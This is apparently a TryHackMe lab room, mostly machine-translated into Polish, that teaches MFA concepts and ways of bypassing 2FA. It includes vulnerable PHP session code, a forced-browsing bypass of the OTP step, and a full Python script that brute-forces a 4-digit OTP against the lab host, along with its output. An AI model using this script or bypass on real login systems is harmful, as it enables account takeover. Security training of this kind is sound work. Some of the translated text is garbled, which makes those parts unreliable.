
Uwierzytelnianie wieloskładnikowe (MFA) odgrywa ważną rolę we współczesnych aplikacjach. Zamiast polegać wyłącznie na haśle, uwierzytelnianie wieloskładnikowe (MFA) wprowadza dodatkowe warstwy ochrony. Zasadniczo MFA to połączenie różnych mechanizmów weryfikacji. Może to być coś, co znasz (np. hasło), coś, co posiadasz (np. smartfon) i coś, czym jesteś (np. odcisk palca). Dzięki tym warstwom MFA znacznie utrudnia atakującym dostęp do kont użytkowników lub aplikacji.

### Cele

Pod koniec tego pokoju będziesz:

- Poznaj zasady działania uwierzytelniania wieloskładnikowego (MFA) i jego znaczenie dla wzmocnienia bezpieczeństwa aplikacji.
- Poznaj różne typy czynników uwierzytelniania używanych w konfiguracjach MFA.
- Poznaj praktyczne scenariusze, w których wdraża się uwierzytelnianie wieloskładnikowe w celu ochrony poufnych danych i systemów.

### Wymagania wstępne

Zanim rozpoczniesz pracę w tym pokoju, powinieneś mieć podstawową wiedzę na temat następujących pojęć:

- Znajomość ogólnych koncepcji mechanizmów uwierzytelniania, w tym wiedza na temat działania haseł i prostych procesów uwierzytelniania.
- Podstawowa umiejętność nawigacji i korzystania zLinuxwiersz poleceń.
- Zakończenie prac nad  salą [Enumeration & Brute Force](https://tryhackme.com/r/room/enumerationbruteforce) .

### Uruchamianie maszyny

Wdrażanie celu Maszyna wirtualna Dołącz do tego zadania, naciskając zielony przycisk **„Start Lab Machine”** . Po uzyskaniu wygenerowanego adresu IP maszyny możesz użyć AttackBoxa lub własnej maszyny wirtualnej podłączonej do TryHackMe. VPN.

Dodaj **MACHINE_IP** do pliku **/etc/hosts** . Na przykład:

/etc/hosts

```shell-session
MACHINE_IP    mfa.thm
```

**sudo sed -i ‘/127.0.1.1\s*tryhackme.lan\s*tryhackme/a machine_ip mfa.thm’ /etc/hosts**

W kolejnych zadaniach będziemy korzystać z aplikacji internetowej uruchomionej na tym komputerze.

W dzisiejszej erze cyfrowej dbanie o bezpieczeństwo naszych poufnych danych i systemów jest ważniejsze niż kiedykolwiek. Uwierzytelnianie wieloskładnikowe (MFA) zapewnia dodatkową ochronę kont użytkowników, wymagając podania co najmniej dwóch czynników weryfikacji. To znacznie utrudnia dostęp do kont użytkowników osobom atakującym.

Należy pamiętać, że 2FA (uwierzytelnianie dwuskładnikowe) jest podzbiorem uwierzytelniania wieloskładnikowego (MFA). MFA odnosi się do dowolnego procesu uwierzytelniania, który wymaga dwóch lub więcej czynników do weryfikacji tożsamości użytkownika.  

### Rodzaje czynników uwierzytelniania

Certyfikacja MFA zazwyczaj łączy dwa lub więcej różnych rodzajów poświadczeń z następujących kategorii: coś, co wiesz, coś, co posiadasz, coś, czym jesteś, gdzie jesteś i coś, co robisz.

![](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724340924297.png)  

**Coś, co wiesz**

Może to być hasło, PIN lub dowolna inna informacja, którą musisz zapamiętać. Stanowi ona podstawę większości systemów uwierzytelniania, ale może być podatna na ataki, jeśli nie jest używana jednocześnie z innymi czynnikami.

**Coś, co masz**

Może to być Twój telefon z aplikacją uwierzytelniającą, token bezpieczeństwa, a nawet karta inteligentna. Ostatnio obserwujemy coraz częstsze wykorzystanie certyfikatów klienckich, które są niczym cyfrowe dowody osobiste dla urządzeń.

**Coś, czym jesteś**

Obejmuje to dane biometryczne, takie jak odciski palców, rozpoznawanie twarzy czy skanowanie tęczówki oka. Ta forma uwierzytelniania zyskuje na popularności, ponieważ jest trudna do podrobienia i jest obecnie obecna w wielu naszych gadżetach, od telefonów po laptopy. Należy pamiętać, że odcisk palca nigdy nie jest w 100% zgodny, podobnie jak skan twarzy. Dlatego jest to jedyny czynnik, który zawsze powinien być czynnikiem uzupełniającym, a nigdy nie powinien być stosowany w oderwaniu od reszty.

**Gdzieś ty jesteś**

Dotyczy to Twojego adresu IP lub geolokalizacji. Niektóre aplikacje, takie jak usługi bankowości internetowej, blokują określone działania, jeśli wykryją, że żądanie pochodzi z nieznanego adresu IP.

**Coś, co robisz**

Ten rodzaj uwierzytelniania jest zazwyczaj stosowany w aplikacjach ograniczających interakcję z botem, takich jak strony rejestracyjne. Aplikacja zazwyczaj analizuje sposób, w jaki użytkownik wpisuje dane uwierzytelniające lub porusza myszą, co jest również najtrudniejsze do wdrożenia, ponieważ aplikacja wymaga określonej mocy obliczeniowej.

2FA wymaga dokładnie dwóch z tych czynników. Zatem, chociaż każde 2FA to MFA, nie każde MFA to 2FA. Na przykład system uwierzytelniania wymagający hasła, skanu odcisku palca i karty inteligentnej byłby uważany za MFA, ale nie za 2FA.  

### Rodzaje 2FA

2FA może wykorzystywać różne mechanizmy, aby zapewnić solidną warstwę bezpieczeństwa dla każdego czynnika uwierzytelniania. Do najpopularniejszych metod należą:

**Jednorazowe hasła oparte na czasie (TOTP)**

Są to hasła tymczasowe, które zmieniają się co około 30 sekund. Korzystają z nich aplikacje takie jak Google Authenticator, Microsoft Authenticator i Authy, co utrudnia hakerom ich przechwycenie lub ponowne wykorzystanie.

**Powiadomienia push**

Aplikacje takie jak Duo czy Google Prompt wysyłają prośbę o zalogowanie bezpośrednio na Twój telefon. Możesz zatwierdzić lub odmówić dostępu bezpośrednio z urządzenia, dodając warstwę zabezpieczeń, która weryfikuje posiadanie urządzenia zarejestrowanego na koncie.

Atak z wykorzystaniem powiadomień push, tzw. MFA Faty, umożliwił atakującemu włamanie się na konto firmowe pracownika Ubera. Szczegóły tego ataku wykraczają poza zakres tego działu, ale aby dowiedzieć się więcej o tym, co się stało, możesz odwiedzić oficjalną redakcję Ubera poświęconą bezpieczeństwu, dostępną  [tutaj.(otwiera się w nowej karcie)](https://www.uber.com/newsroom/security-update).

**SMS**

Większość aplikacji korzysta obecnie z tej metody. System wysyła SMS-a z jednorazowym kodem na zarejestrowany numer telefonu użytkownika. Użytkownik musi wprowadzić ten kod, aby kontynuować logowanie. Choć uwierzytelnianie za pomocą SMS-ów jest wygodne, jest mniej bezpieczne ze względu na luki w zabezpieczeniach związane z przechwytywaniem wiadomości tekstowych.

**Tokeny sprzętowe**

Urządzenia takie jak YubiKeys generują jednorazowy kod dostępu lub wykorzystują NFC do uwierzytelniania. Są świetne, ponieważ nie wymagają sieci ani baterii, więc działają nawet offline.

### Dostęp warunkowy

Dostęp warunkowy jest zazwyczaj wykorzystywany przez firmy do dostosowywania wymagań uwierzytelniania w zależności od kontekstu. Działa jak drzewo decyzyjne, które uruchamia dodatkowe kontrole bezpieczeństwa w zależności od określonych warunków. Na przykład:

**Oparte na lokalizacji**

Jeśli użytkownik loguje się ze swojej zwykłej lokalizacji, takiej jak biuro, może być konieczne podanie jedynie standardowych danych logowania. Jeśli jednak loguje się z nowej lub nieznanej lokalizacji, system może poprosić o dodatkowe hasło jednorazowe (OTP), a nawet o weryfikację biometryczną.

**Oparte na czasie**

W godzinach pracy użytkownicy mogą logować się tylko za pomocą standardowych danych logowania. Jeśli jednak ktoś spróbuje uzyskać dostęp do systemu po godzinach pracy, może zostać poproszony o podanie dodatkowego zabezpieczenia, takiego jak hasło jednorazowe (OTP) lub token bezpieczeństwa.

**Analiza behawioralna**

Załóżmy, że zachowanie użytkownika nagle się zmieni, na przykład zacznie uzyskiwać dostęp do danych, których zazwyczaj nie przegląda lub do których nie ma dostępu o nietypowych porach. W takim przypadku system może poprosić o dodatkowe uwierzytelnienie, aby potwierdzić, że to naprawdę on.  

**Specyficzne dla urządzenia**

W niektórych przypadkach firmy nie zezwalają pracownikom na korzystanie z własnych urządzeń w celu uzyskania dostępu do zasobów firmowych. W takich sytuacjach system może zablokować użytkownika po pierwszym logowaniu, jeśli korzysta on z niezatwierdzonego urządzenia.

### Globalna adopcja i nacisk regulacyjny

Wdrażanie uwierzytelniania wieloskładnikowego szybko rozprzestrzenia się w różnych sektorach ze względu na jego skuteczność w ochronie przed wieloma powszechnymi zagrożeniami bezpieczeństwa, w tymphishing, inżynieria społeczna oraz ataki oparte na hasłach. Rządy i branże na całym świecie dostrzegają znaczenie uwierzytelniania wieloskładnikowego (MFA) i zaczynają nakazywać jego stosowanie za pośrednictwem różnych ram regulacyjnych. Na przykład sektory finansów i opieki zdrowotnej wdrażają obecnie rygorystyczne wymogi dotyczące uwierzytelniania wieloskładnikowego (MFA), aby zachować zgodność z przepisami, takimi jak: RODO w Europie, HIPAA  Stanach Zjednoczonych i PCI-DSS dla systemów płatniczych na całym świecie.

Wielu naruszeniom bezpieczeństwa, takim jak naruszenie bezpieczeństwa danych w firmie Equifax w 2017 r. czy naruszenie bezpieczeństwa danych w firmie Target w 2013 r., można było zapobiec, gdyby wdrożono uwierzytelnianie wieloskładnikowe.


Uwierzytelnianie wieloskładnikowe (MFA) jest obecnie ważnym czynnikiem zapewniającym bezpieczeństwo naszej aktywności online i offline przed atakami. Od bankowości i opieki zdrowotnej po korporacyjne IT, branże te w dużym stopniu polegają na uwierzytelnianiu wieloskładnikowym (MFA), aby chronić dane przed atakującymi.

MFA w bankowości
Banki codziennie przetwarzają niezwykle wrażliwe informacje i transakcje. Korzystając z uwierzytelniania wieloskładnikowego (MFA), banki mogą chronić dane osobowe i finansowe użytkowników przed cyberkradzieżą, oszustwami i innymi zagrożeniami online.

Zazwyczaj banki proszą o podanie hasła (czegoś, co znasz), zanim przejdą do drugiej warstwy zabezpieczeń, czyli kodu wysłanego SMS-em lub wygenerowanego przez aplikację w telefonie (coś, co posiadasz). W ten sposób, nawet jeśli ktoś zdobędzie Twoje hasło, nadal będzie potrzebował tej dodatkowej informacji, aby uzyskać dostęp do Twojego konta lub dokonać transakcji.

MFA w opiece zdrowotnej
W opiece zdrowotnej, ze względu na przepisy takie jak HIPAA(otwiera się w nowej karcie)w USA MFA dba o to, aby dokumentacja pacjentów i informacje dotyczące ich stanu zdrowia były dostępne wyłącznie dla osób upoważnionych.

Na przykład, aby uzyskać dostęp do wrażliwych systemów, takich jak elektroniczna dokumentacja medyczna (EHR), pracownicy służby zdrowia mogą wymagać od lekarza użycia identyfikatora bezpieczeństwa (czegoś, co posiada) i zeskanowania odcisku palca (czegoś, co jest jego własnością). Dzięki temu tylko osoby posiadające odpowiednie uprawnienia mogą przeglądać lub modyfikować dane pacjenta.

MFA w informatyce korporacyjnej
W obliczu rosnącej liczby ataków cybernetycznych i naruszeń danych działy IT w świecie korporacyjnym są pod ogromną presją ochrony poufnych danych biznesowych i utrzymania systemów uczciwość MFA pomaga ograniczyć ryzyko nieautoryzowanego dostępu, które może prowadzić do kradzieży danych, szpiegostwa lub sabotażu.

W środowisku korporacyjnym uwierzytelnianie wieloskładnikowe (MFA) jest zazwyczaj używane do uzyskiwania dostępu do sieci firmowych, baz danych i usług w chmurze. Pracownicy mogą najpierw zalogować się za pomocą swoich danych firmowych (coś, co znają), a następnie zweryfikować swoją tożsamość za pomocą kodu wysłanego na telefon służbowy (coś, co posiadają) lub za pomocą weryfikacji biometrycznej (coś, czym są). W ten sposób, nawet jeśli ktoś spróbuje zaatakować ich system, napotka przeszkodę bez drugiego czynnika.

Słabe algorytmy generowania OTP
Bezpieczeństwo hasła jednorazowego (OTP) zależy od algorytmu użytego do jego utworzenia. Jeśli algorytm jest słaby lub zbyt przewidywalny, może to utrudnić atakującemu odgadnięcie hasła jednorazowego. Jeśli algorytm nie wykorzystuje prawdziwie losowych ziaren, generowane hasła jednorazowe mogą podążać za pewnym wzorcem, co czyni je bardziej podatnymi na przewidywanie.

Wyciek aplikacji z tokenem 2FA
Jeśli aplikacja źle obsługuje dane lub ma luki w zabezpieczeniach, np.APIpunktów końcowych, może to spowodować przypadkowy wyciek tokenu 2FA w aplikacjiHTTPodpowiedź.

Ze względu na niezabezpieczone kodowanie, niektóre aplikacje mogą również wyciekać token 2FA w odpowiedzi. Typowym scenariuszem jest sytuacja, gdy użytkownik po zalogowaniu przechodzi na stronę 2FA, a aplikacja wysyła żądanie XHR do punktu końcowego, który wydaje jednorazowe hasło (OTP). Czasami to żądanie XHR zwraca użytkownikowi jednorazowe hasło (OTP) w odpowiedzi HTTP.

Brutalna próba użycia OTP
Chociaż hasła jednorazowe (OTP) są przeznaczone do jednorazowego użytku, nie są odporne na ataki siłowe. Jeśli atakujący może zgadywać bez ograniczeń, może w końcu uzyskać prawidłowe hasło jednorazowe, zwłaszcza jeśli nie jest ono dobrze chronione dodatkowymi zabezpieczeniami. To jak próba włamania się do sejfu poprzez wielokrotne przekręcanie pokrętła, aż kliknie i się otworzy. Przy wystarczającej ilości czasu i bez ograniczeń, może się udać.

Brak ograniczenia szybkości

Bez odpowiedniego limitu przepustowości aplikacja jest podatna na ataki, które mogą bez problemu próbować różnych haseł jednorazowych (OTP). Jeśli atakujący może przesłać wiele prób w krótkim czasie, zwiększa to prawdopodobieństwo uzyskania prawidłowego hasła jednorazowego (OTP).

Na przykład w tym raporcie HackerOne(otwiera się w nowej karcie)tester był w stanie zgłosić istotny błąd, ponieważ aplikacja nie stosuje ograniczeń szybkości sprawdzania kodu 2FA.

Użycie Evilginx
Zły(otwiera się w nowej karcie)to narzędzie, które jest zazwyczaj wykorzystywane w działaniach zespołu red. Ponieważ może być używane do wykonywania zaawansowanych phishing ataki, skutecznie omijając uwierzytelnianie wieloskładnikowe (MFA). Działa jako pośrednik pełnomocnik które mogą przechwytywać i przekierowywać hasła jednorazowe przeznaczone dla legalnych użytkowników.



Zasada działania Evilginx jest taka, że ​​gdy atakujący wysyła Ci link phishingowy, a Ty wprowadzasz swoje dane na stronie, która wygląda na legalną, Evilginx przechwytuje Twoją nazwę użytkownika, hasło i jednorazowe hasło (OTP) i przekazuje je do prawdziwej witryny, umożliwiając atakującym dostęp za pomocą Twoich plików cookie bez konieczności łamania uwierzytelniania wieloskładnikowego.

Logic Flaw or Insecure Coding?
In some applications, flawed logic or insecure coding practices can lead to a situation where critical parts of the application (i.e., the dashboard) can be accessed without fully completing the authentication process. Specifically, an attacker might be able to bypass the 2FA mechanism entirely and gain access to the dashboard or other sensitive areas without entering the OTP (One-Time Password). This is often due to improper session management, poor access control checks, or incorrectly implemented logic that fails to enforce the 2FA requirement.

Exploitation
Go to http://mfa.thm/labs/second/(opens in new tab) and log in to the application using the credentials below.

Username	Password
thm@mail.thm	test123


Typically, the attacker first needs to understand how the application’s login and 2FA process work. In this case, after entering the username and password, the user is prompted to enter an OTP to gain access to the dashboard.



Instead of entering the OTP, the attacker might try to manipulate the URL or bypass the OTP step altogether. For example, the attacker might try to directly access the dashboard URL (e.g., http://mfa.thm/labs/second/dashboard) without completing the required authentication steps.

If the application doesn't properly check the session state or enforce 2FA or the application's logic is flawed, the attacker might gain access to the dashboard.



Diving deeper into the code
The below code is part of the code that is used in the /mfa page. As you can see, the $_SESSION['authenticated'] is issued after the completion of the 2FA process.


# Function that verifies the submitted 2FA token
function verify_2fa_code($code) {
    if (!isset($_SESSION['token']))
    return false;

    return $code === $_SESSION['token'];
}

# Function called in the /mfa page
if (verify_2fa_code($_POST['code'])) { #If successful, the user will be redirected to the dashboard.
    $_SESSION['authenticated'] = true; # Session that is used to check if the user completed the 2FA
    header('Location: ' . ROOT_DIR . '/dashboard');
    return;
}
Considering the above implementation is secure, some instances of dangling issuance of the $_SESSION['authenticated'] after the first step of authentication will bypass the above code, as shown below.


function authenticate($email, $password){
  $pdo = get_db_connection();
  $stmt = $pdo->prepare("SELECT `password` FROM users WHERE email = :email");
  $stmt->execute(['email' => $email]);
  $user = $stmt->fetch(PDO::FETCH_ASSOC);

  return $user && password_verify($password, $user['password']);
}

if (authenticate($email, $password)) {
    $_SESSION['authenticated'] = true; # This flag should only be issued after the MFA completion
    $_SESSION['email'] = $_POST['email'];
    header('Location: ' . ROOT_DIR . '/mfa');
    return;
}
Since the application's dashboard only checks for the value of $_SESSION['authenticated'], whether it's true or false, the attacker can easily bypass the 2FA page, considering the attacker has prior knowledge of the application's endpoints.

To remediate this vulnerability, the cookie or session that is used in authentication checks should be split into two parts. The first part is the one that sets the session after successful username and password verification; the sole purpose of this session is to submit a 2FA token. The second session should only be after the OTP is validated.


W niektórych aplikacjach niepowodzenie weryfikacji 2FA może spowodować, że aplikacja cofnie użytkownika do pierwszej części procesu uwierzytelniania (tj. początkowego logowania z użyciem nazwy użytkownika i hasła). Takie zachowanie zazwyczaj wynika z mechanizmów bezpieczeństwa zaprojektowanych w celu zapobiegania atakom siłowym na część 2FA aplikacji. Aplikacja może wymusić na użytkowniku ponowne uwierzytelnienie, aby upewnić się, że osoba próbująca się zalogować jest rzeczywiście legalnym użytkownikiem, a nie atakującym próbującym odgadnąć hasło jednorazowe (OTP).

Najczęstsze przyczyny takiego zachowania
Unieważnienie sesji

Jeśli uwierzytelnianie dwuskładnikowe nie powiedzie się, aplikacja może unieważnić sesję użytkownika w ramach środków bezpieczeństwa, zmuszając go do rozpoczęcia procesu uwierzytelniania od nowa.

Zasady ograniczania przepustowości i blokowania

Aby uniemożliwić atakującym wielokrotne próby ominięcia uwierzytelniania dwuskładnikowego, aplikacja może mieć wdrożone mechanizmy ograniczania przepustowości lub blokady, które uruchamiają się po określonej liczbie nieudanych prób, umożliwiając użytkownikowi powrót do początkowego kroku logowania.

Przekierowanie sterowane bezpieczeństwem

Niektóre aplikacje są zaprojektowane tak, aby po kilku nieudanych próbach uwierzytelniania dwuskładnikowego przekierowywać użytkowników z powrotem na stronę logowania jako dodatkowe zabezpieczenie, zapewniając w ten sposób ponowną weryfikację danych logowania użytkownika przed kolejną próbą uwierzytelniania dwuskładnikowego.

Automatyzacja jest kluczem
Automatyzacja ułatwia atakowanie tego typu zabezpieczeń, ponieważ:

Prędkość

Ręczne logowanie się za każdym razem, gdy się wylogujesz, jest powolne i żmudne. Automatyzacja może zrobić to za Ciebie znacznie szybciej.

Konsystencja

Automatyzacja pozwala uniknąć błędów, które mogą wystąpić, gdy ciągle wykonujesz te same, powtarzalne czynności. Jest niezawodna.

Odzyskiwanie po wylogowaniu

Jeśli aplikacja wyloguje Cię po kilku nieudanych próbach, skrypt automatycznie zaloguje się ponownie i będzie próbował ponownie. Dzięki temu nie musisz za każdym razem ręcznie tego robić.

Personalizacja

Ręczne tworzenie skryptu automatyzacji ataku zapewnia większą elastyczność niż korzystanie z pojedynczego narzędzia, takiego jakZASTRZELIĆLubBurp SuiteMożesz dostosować skrypty do testowania konkretnych scenariuszy, np. używając różnych adresów IP lub agentów użytkownika albo zmieniając czas między żądaniami.

Eksploatacja
Aplikacja hostowana whttp://magister sztuki.thm/laboratoria/trzeci(otwiera się w nowej karcie) Automatycznie wylogowuje użytkownika, jeśli nie przejdzie on weryfikacji dwuetapowej. W celach demonstracyjnych aplikacja generuje również 4-cyfrowy kod PIN za każdym razem, gdy użytkownik się do niej loguje.

Uwaga: W rzeczywistych zastosowaniach kod PIN zwykle zawiera się w przedziale od 0000 do 9999. Ustawiliśmy niższą wartość tylko po to, aby zaoszczędzić czas potrzebny na włamanie się metodą siłową.


function generateToken()
{
    $token = strval(rand(1250, 1350));

    $_SESSION['token'] = $token;
    return 'success';
}
Używając poniższego skryptu Pythona, zapisz skrypt jako exploit.py i uruchom go w swoim terminalu.


import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
Kliknij tutaj, aby zapoznać się ze szczegółowym opisem skryptu.
Konfiguracja skryptu

Adresy URL :

login_url:Adres URL strony logowania, na której użytkownik wprowadza swój adres e-mail i hasło.
otp_url:Adres URL, pod którym użytkownik przesyła 4-cyfrowy kod OTP w celu weryfikacji.
dashboard_url:Adres URL pulpitu nawigacyjnego, do którego użytkownik zostanie przekierowany po pomyślnym uwierzytelnieniu.
Referencje :

W słowniku credentialsznajdziesz adres e-mail i hasło, które będą użyte do zalogowania.
Nagłówki :

Słownik headerszawiera nagłówki HTTP imitujące rzeczywiste żądania przeglądarki, w tym User-Agent, Referer, Content-Typei inne.
Funkcje

is_login_successful(odpowiedź) :

Sprawdza, czy logowanie powiodło się, wyszukując w tekście odpowiedzi frazę „Weryfikacja użytkownika” i upewniając się, że kod statusu to 200 OK.
login(sesja) :

Wykonuje logowanie, wysyłając żądanie POST z danymi uwierzytelniającymi użytkownika do serwera login_url. Zwraca odpowiedź serwera.
submit_otp(sesja, otp) :

Wysyła 4-cyfrowy kod OTP do serwera otp_urlw żądaniu POST. Kod OTP jest dzielony na pojedyncze cyfry i wysyłany jako osobne parametry ( code-1, code-2, itd.). Funkcja zwraca odpowiedź serwera.
is_login_page(odpowiedź) :

Sprawdza, czy odpowiedź zawiera stronę logowania, wyszukując w tekście odpowiedzi słowa kluczowe, takie jak „Zaloguj się na swoje konto” lub „Zaloguj się”.
Proces siłowy

Zakres OTP :

Skrypt działa w pętli, dopóki aplikacja nie odpowie tym samym hasłem OTP ustawionym w skrypcie.
Tworzenie sesji :

Przy każdej próbie podania hasła OTP tworzona jest nowa sesja requests.Session(), co zapewnia nową sesję przy każdym logowaniu i próbie podania hasła OTP.
Próba logowania :

Skrypt próbuje zalogować się przy użyciu podanych danych. Jeśli logowanie się powiedzie, wyświetla komunikat „Logged in successfully” (Zalogowano pomyślnie) i przechodzi do przesyłania hasła jednorazowego (OTP). Jeśli logowanie się nie powiedzie, skrypt pomija próbę podania hasła jednorazowego (OTP).
Złożenie OTP :

Skrypt formatuje OTP jako ciąg 4-cyfrowy i wysyła go do otp_url.
Obsługa odpowiedzi :

Jeżeli odpowiedź serwera zawiera stronę logowania (oznaczającą nieudaną próbę podania hasła jednorazowego), skrypt wyświetla komunikat o błędzie i przechodzi do następnego hasła jednorazowego.
Jeżeli odpowiedź zawiera 302 Foundkod statusu (oznaczający przekierowanie), sprawdzany jest Locationnagłówek:
W przypadku przekierowania do /labs/third/dashboard, oznacza to pomyślne pominięcie hasła OTP, skrypt wyświetla komunikat o powodzeniu i kończy działanie.
W przypadku przekierowania na /labs/third/(stronę logowania) oznacza to, że nie udało się podać hasła jednorazowego (OTP), a skrypt wyświetla komunikat o błędzie.
Każda inna lokalizacja przekierowania jest oznaczana jako nieoczekiwana i wyświetlany jest komunikat o błędzie.
Jeżeli odpowiedź zawiera inny kod statusu, skrypt wyświetla kod statusu i ponawia próbę podania następnego hasła OTP.
Gdy skryptowi uda się skutecznie złamać kod bezpieczeństwa, zaloguj się do aplikacji.


exploit.py
user@tryhackme$ $ python3 exploit.py
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Unsuccessful OTP attempt, redirected to login page. OTP: 1337
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Unsuccessful OTP attempt, redirected to login page. OTP: 1337
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Session cookies: {'PHPSESSID': '57burqsvce3odaif2oqtptbl13'}
Używając nowego PHPSESSID, przejdź do http://mfa.thm/labs/third(otwiera się w nowej karcie), otwórz narzędzia programistyczne w przeglądarce i przejdź do Pamięć > Pliki cookie.



Zastąp wartość PHPSESSID wartością PHPSESSID z terminala.



Po wykonaniu tej czynności przejdź do http://mfa.thm/labs/third/dashboard.

Wniosek
W tym pomieszczeniu omówiliśmy podstawy uwierzytelniania wieloskładnikowego (MFA) lub uwierzytelnianie dwuskładnikowe (2FA), dzięki czemu dowiesz się, w jaki sposób te środki bezpieczeństwa chronią systemy przed nieautoryzowanym dostępem.

Najważniejsze wnioski
Zrozumienie uwierzytelniania wieloskładnikowego (MFA) : uwierzytelnianie wieloskładnikowe dodaje kolejne warstwy zabezpieczeń, wymagając wielu form weryfikacji, co znacznie zmniejsza ryzyko nieautoryzowanego dostępu.
Rozwiązywanie problemów : Typowe problemy, takie jak słabe algorytmy OTP i brak ograniczeń przepustowości, mogą osłabiać bezpieczeństwo, co podkreśla potrzebę stosowania skutecznych praktyk wdrożeniowych.
Najlepsze praktyki : Bezpieczne generowanie haseł jednorazowych (OTP), ograniczanie przepustowości i edukacja użytkowników są kluczowe dla utrzymania efektywności systemów MFA.